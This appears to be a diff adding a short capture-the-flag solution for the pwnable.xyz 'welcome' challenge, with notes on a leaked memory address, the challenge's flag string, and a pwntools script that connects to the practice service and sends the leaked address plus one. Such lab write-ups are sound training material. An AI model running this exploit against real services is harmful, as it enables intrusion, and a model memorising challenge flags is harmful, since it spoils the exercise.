@@ -1,0 +1,20 @@
+0x7fedc4d70010 -- memory leak changes every time ; 
+echo $((mem_leak)) -- length of the message;
+'' -- message
+FLAG{did_you_really_need_a_script_to_solve_this_one?} -- flag
+
+
+---/*welcome.py*/-----
+from pwn import *
+
+r = remote('svc.pwnable.xyz',30000)
+
+r.recvline()
+leak = int(r.recvline().split('Leak: ')[-1],16)
+
+r.sendline('{}\n'.format(leak + 1))
+r.interactive()
+
+
+
+
